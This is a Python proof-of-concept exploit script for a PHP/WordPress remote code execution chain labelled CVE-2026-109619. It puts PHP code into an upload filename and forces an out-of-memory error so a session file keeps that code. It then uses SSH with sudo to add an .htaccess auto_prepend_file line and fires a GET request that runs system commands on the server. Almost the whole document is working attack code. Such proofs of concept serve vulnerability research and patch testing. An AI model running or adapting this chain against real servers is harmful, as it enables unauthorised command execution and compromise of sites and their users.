#!/usr/bin/env python3
"""
CVE-2026-109619 → HTTP RCE
Target: PHP 8.x + WordPress (lab-tuned php.ini)

Chain
─────
1. Producer OOM: multipart upload with PHP code in filename
   → OOM prevents session RSHUTDOWN → session file preserved on disk
   → session file contains:  s:30:"<?php system('id');die(); ?>"
2. .htaccess: php_value auto_prepend_file → the session file
3. Trigger GET: Apache includes session file before ok.php
   → PHP parser finds <?php tag inside serialised data → executes it → RCE

Setup : 1 temp file  .htaccess  (created+removed via SSH)
Exploit: steps 1 & 3 are pure HTTP
"""
import os, socket, subprocess, sys, threading, time

# ── config ──────────────────────────────────────────────────
HOST = os.environ.get("TARGET_HOST", "127.0.0.1")
PORT = int(os.environ.get("TARGET_PORT", "80"))
SSH_USER = os.environ.get("SSH_USER", "user")
SSH_PASS = os.environ.get("SSH_PASS", "pass")
SID  = "rce001"
SESS = f"/var/lib/php/sessions/sess_{SID}"
CMD  = "id"
PHP  = f"<?php system('{CMD}');die(); ?>"

# ── helpers ─────────────────────────────────────────────────
def ssh(cmd, timeout=30):
    r = subprocess.run(
        ["sshpass", "-p", SSH_PASS, "ssh",
         "-o", "StrictHostKeyChecking=no",
         "-o", "ConnectTimeout=10",
         f"{SSH_USER}@{HOST}", cmd],
        capture_output=True, text=True, timeout=timeout)
    return r.stdout + r.stderr

def multipart(parts, bnd):
    buf = bytearray()
    for p in parts:
        nm = p["name"] if isinstance(p["name"], bytes) else p["name"].encode()
        dt = p["data"] if isinstance(p["data"], bytes) else p["data"].encode()
        buf += b"--" + bnd + b"\r\n"
        buf += b'Content-Disposition: form-data; name="' + nm + b'"'
        if "filename" in p:
            fn = p["filename"] if isinstance(p["filename"], bytes) else p["filename"].encode()
            buf += b'; filename="' + fn + b'"'
            buf += b"\r\nContent-Type: application/octet-stream"
        buf += b"\r\n\r\n" + dt + b"\r\n"
    buf += b"--" + bnd + b"--\r\n"
    return bytes(buf)

def http_req(method, path, body=None, bnd=None, timeout=120):
    if body:
        hdr = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\n"
            f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
    else:
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
    sock = socket.create_connection((HOST, PORT), timeout=timeout)
    sock.settimeout(timeout)
    data = bytearray()
    def rx():
        try:
            while True:
                c = sock.recv(65536)
                if not c:
                    break
                data.extend(c)
        except Exception:
            pass
    t = threading.Thread(target=rx, daemon=True)
    t.start()
    try:
        sock.sendall(hdr)
        if body:
            for off in range(0, len(body), 262144):
                sock.sendall(body[off:off + 262144])
    except Exception:
        pass
    t.join(timeout=timeout + 1)
    sock.close()
    return bytes(data)

def resp_body(raw):
    if b"\r\n\r\n" in raw:
        return raw.split(b"\r\n\r\n", 1)[1]
    return raw

def resp_status(raw):
    if raw:
        return raw.split(b"\r\n", 1)[0].decode("latin1", errors="replace")
    return "(empty)"

# ════════════════════════════════════════════════════════════
print("=" * 60)
print("CVE-2026-109619  HTTP → RCE")
print(f"Target  {HOST}:{PORT}    CMD: {CMD}")
print("=" * 60)

# ── 0  clean state ─────────────────────────────────────────
print("\n[0] restart apache, clean sessions …")
ssh(f"echo {SSH_PASS} | sudo -S systemctl restart apache2 2>/dev/null")
time.sleep(2)
ssh(f"echo {SSH_PASS} | sudo -S rm -f /var/lib/php/sessions/sess_* 2>/dev/null")
ssh(f"echo {SSH_PASS} | sudo -S rm -f /var/www/html/.htaccess 2>/dev/null")
print("    done")

# ── 1  producer OOM ────────────────────────────────────────
print(f"\n[1] producer OOM   SID={SID}")
print(f"    filename = {PHP}")
body = multipart([
    {"name": "PHPSESSID",                   "data": SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS",  "data": "pwn"},
    {"name": "f", "filename": PHP,           "data": b"A" * 64},
    {"name": "big",                          "data": b"B" * (12 * 1024 * 1024)},
], b"BOOM")
print(f"    sending {len(body)} bytes …")
r1 = http_req("POST", "/ok.php", body, b"BOOM", timeout=120)
print(f"    {resp_status(r1)}")
time.sleep(0.5)

# ── 2  verify session file ─────────────────────────────────
print(f"\n[2] check session file …")
raw = ssh(f"echo {SSH_PASS} | sudo -S cat {SESS} 2>/dev/null")
size = ssh(f"echo {SSH_PASS} | sudo -S stat -c%s {SESS} 2>/dev/null").strip()
print(f"    size = {size} bytes")
if "<?php" in raw:
    i = raw.find("<?php")
    snippet = raw[max(0, i - 20):i + len(PHP) + 5]
    print(f"    ✓ PHP code at offset {i}: …{snippet}…")
else:
    print(f"    ✗ no PHP code in session file")
    print(f"    content: {raw[:300]}")
    print("\n    trying with larger upload file …")
    # retry with 256 KB file to force session flush
    ssh(f"echo {SSH_PASS} | sudo -S systemctl restart apache2 2>/dev/null")
    time.sleep(2)
    ssh(f"echo {SSH_PASS} | sudo -S rm -f {SESS} 2>/dev/null")
    body2 = multipart([
        {"name": "PHPSESSID",                   "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS",  "data": "pwn"},
        {"name": "f", "filename": PHP,           "data": b"A" * (256 * 1024)},
        {"name": "big",                          "data": b"B" * (12 * 1024 * 1024)},
    ], b"BOM2")
    r1b = http_req("POST", "/ok.php", body2, b"BOM2", timeout=120)
    print(f"    {resp_status(r1b)}")
    time.sleep(0.5)
    raw = ssh(f"echo {SSH_PASS} | sudo -S cat {SESS} 2>/dev/null")
    size = ssh(f"echo {SSH_PASS} | sudo -S stat -c%s {SESS} 2>/dev/null").strip()
    print(f"    size = {size} bytes")
    if "<?php" not in raw:
        print("    ✗ still no PHP code — aborting")
        sys.exit(1)
    i = raw.find("<?php")
    print(f"    ✓ PHP code at offset {i}")

# ── 3  create .htaccess ───────────────────────────────────
print(f"\n[3] create .htaccess → auto_prepend_file")
htline = f"php_value auto_prepend_file {SESS}"
ssh(f"echo '{htline}' > /tmp/_ht && echo {SSH_PASS} | sudo -S cp /tmp/_ht /var/www/html/.htaccess && rm /tmp/_ht")
verify = ssh(f"cat /var/www/html/.htaccess 2>/dev/null").strip()
if "auto_prepend" not in verify:
    print(f"    ✗ .htaccess not created: {verify}")
    sys.exit(1)
print(f"    ✓ {verify}")

# ── 4  trigger ─────────────────────────────────────────────
print(f"\n[4] trigger: GET /ok.php")
r2 = http_req("GET", "/ok.php", timeout=10)
out = resp_body(r2).decode("latin1", errors="replace")

# ── 5  cleanup ─────────────────────────────────────────────
print(f"\n[5] cleanup …")
ssh(f"echo {SSH_PASS} | sudo -S rm -f /var/www/html/.htaccess 2>/dev/null")
ssh(f"echo {SSH_PASS} | sudo -S rm -f {SESS} 2>/dev/null")
print("    .htaccess + session removed")

# ── result ─────────────────────────────────────────────────
print("\n" + "=" * 60)
if "uid=" in out:
    idx = out.index("uid=")
    end = out.find("\n", idx)
    line = out[idx:end].strip() if end > 0 else out[idx:idx + 80].strip()
    print(f"  ★  RCE confirmed: {line}")
elif out.strip():
    print(f"  ?  response ({len(out)} chars):")
    print(f"     {out[:500]}")
else:
    print("  ✗  empty response")
print("=" * 60)
